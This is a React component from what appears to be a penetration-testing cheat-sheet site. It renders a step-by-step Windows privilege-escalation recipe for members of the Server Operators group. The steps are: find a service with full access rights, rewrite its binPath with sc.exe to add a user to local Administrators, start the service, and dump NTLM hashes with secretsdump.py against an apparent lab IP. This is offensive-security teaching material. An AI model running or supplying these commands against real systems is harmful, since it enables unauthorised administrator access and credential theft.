import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const ServerOperators = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              The Server Operators group allows members to administer Windows
              servers without needing assignment of Domain Admin privileges.
              Membership of this group confers the powerful `SeBackupPrivilege`
              and `SeRestorePrivilege` privileges and the ability to control
              local services.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Download PsService from Sysinternals suite. This tool is similar
              to the `sc` utility and can display service status and
              configurations and also allow you to start, stop, pause, resume,
              and restart services both locally and on remote hosts.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"wget https://download.sysinternals.com/files/PSTools.zip"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Run PsService.exe on a service until you find one that has
              SERVICE_ALL_ACCESS access rights for the Server Operators group.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"PsService.exe security AppReadiness"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              With SERVICE_ALL_ACCESS rights, we can modify the binary path of
              the service to execute a command which adds our current user to
              the local administrators group.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'sc.exe config {SERVICE} binPath= "cmd /c net localgroup Administrators {USER} /add"'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>Start the service</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"sc.exe start AppReadiness"}
            </SyntaxHighlighter>

            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Confirm that we were added to local administrators group
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"net localgroup Administrators"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 6</Typography>
            <Typography>Dump NTLM hashs</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default ServerOperators;
